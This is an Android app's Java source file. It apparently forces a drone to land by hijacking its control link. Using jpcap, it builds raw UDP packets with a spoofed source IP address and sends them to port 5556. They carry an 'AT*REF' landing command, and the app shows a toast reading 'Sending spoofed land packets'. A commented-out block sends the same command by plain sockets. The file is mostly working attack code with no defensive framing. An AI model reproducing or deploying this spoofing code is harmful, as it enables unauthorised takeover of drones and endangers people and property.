package com.example.testdrone;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

import jpcap.*;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.UDPPacket;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        IPAddressView ip_view=new IPAddressView(MainActivity.this);//Enter IPAddress
        ip_view.setLayout(R.layout.activity_main);
    }

    public void Forcelanding(View view){
        Toast.makeText(MainActivity.this,"emergency",Toast.LENGTH_SHORT).show();
        Toast.makeText(MainActivity.this,"Sending spoofed land packets",Toast.LENGTH_SHORT).show();
        sendudp();

    }

    private void sendudp(){
        new Thread(new Runnable() {
            public void run() {
                //jpcap
                JpcapSender sender= null;
                try {
                    sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                UDPPacket p=new UDPPacket(5556,5556);
                try {
                    p.setIPv4Parameter(0,false,false,false,0,false,false,false,0,1010101,100,IPPacket.IPPROTO_UDP,
                            InetAddress.getByName("192.168.1.2"),InetAddress.getByName("192.168.1.1"));
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                    Log.e("MainActivity","Unknown host");
                }
                p.data=("AT*REF=" + "1000000" + ",290717952\r").getBytes();

                EthernetPacket ether=new EthernetPacket();
                ether.frametype=EthernetPacket.ETHERTYPE_IP;
                ether.src_mac=new byte[]{(byte)0,(byte)1,(byte)2,(byte)3,(byte)4,(byte)5};
                ether.dst_mac=new byte[]{(byte)0,(byte)6,(byte)7,(byte)8,(byte)9,(byte)10};
                p.datalink=ether;

                for(int i=0;i<5;i++) {
                    sender.sendPacket(p);
                    Log.e("MainActivity","Send successfully.");
                }

                /**
                 *This can successfully send a UDP packet whose source IP address is the native IP address
                 * try{
                 *                     //sender
                 *                     InetSocketAddress senderAdd=new InetSocketAddress();
                 *                     //The receiver
                 *                     InetSocketAddress receiverAdd=new InetSocketAddress("172.31.16.159",5556);
                 *                     DatagramSocket socket= new DatagramSocket(senderAdd);
                 *
                 *                     for(int i=0;i<10;i++){
                 *                         //data
                 *                         String msg="AT*REF=" + "1000000"+i + ",290717952\r";
                 *                         byte[] buf=msg.getBytes();
                 *                         DatagramPacket packet=new DatagramPacket(buf,buf.length,receiverAdd);
                 *                         //send
                 *                         socket.send(packet);
                 *
                 *                         Log.e("Sender","Send successfully.");
                 *                     }
                 *                     socket.close();
                 *                 }catch (SocketException e) {
                 *                     e.printStackTrace();
                 *                     Log.e("MainActivity","Socket creation error");
                 *                 } catch (IOException e) {
                 *                     e.printStackTrace();
                 *                     Log.e("MainActivity","IOException");
                 *                 }
                 */

            }

        }).start();
    }

}
